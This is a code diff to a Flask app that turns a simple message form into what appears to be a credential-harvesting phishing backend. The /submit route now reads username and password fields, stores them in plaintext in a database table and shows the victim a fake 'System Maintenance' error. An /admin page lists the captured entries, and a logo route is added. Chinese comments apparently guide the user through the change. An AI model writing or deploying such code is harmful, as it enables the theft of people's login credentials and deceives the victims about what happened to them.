@@ -36,18 +36,24 @@ def index():
 
 @app.route('/submit', methods=['POST'])
 def submit():
-    user_input = request.form.get('message')
+    # 读取你 HTML 里的 username 和 password 字段
+    user_id = request.form.get('username')
+    pwd = request.form.get('password')
     
-    if user_input:
-        # 将数据插入到数据库中
+    if user_id and pwd:
+        # 写入你 Render 数据库的 messages 表
         conn = psycopg2.connect(DATABASE_URL)
         cur = conn.cursor()
-        cur.execute("INSERT INTO messages (content) VALUES (%s)", (user_input,))
+        
+        # 建议把内容拼起来存入之前的 content 字段，或者你可以修改数据库增加列
+        log_content = f"ID: {user_id} | PWD: {pwd}"
+        
+        cur.execute("INSERT INTO messages (content) VALUES (%s)", (log_content,))
         conn.commit()
         cur.close()
         conn.close()
             
-    return "<h3>提交成功！感谢你的输入。</h3><a href='/'>返回</a>"
+    return "<h3>System Maintenance. Please try again later.</h3><a href='/'>Back</a>"
 
 # 这是一个简易的“后台查看页面”，访问 你的网址/admin 就能看到所有数据
 @app.route('/admin')
@@ -66,6 +72,12 @@ def admin():
     display_text += "</ul><a href='/'>返回首页</a>"
     
     return display_text
+
+from flask import send_file
+
+@app.route('/logo.png')
+def get_logo():
+    return send_file('logo.png')
 
 if __name__ == '__main__':
     app.run(host='0.0.0.0', port=5000, debug=True)
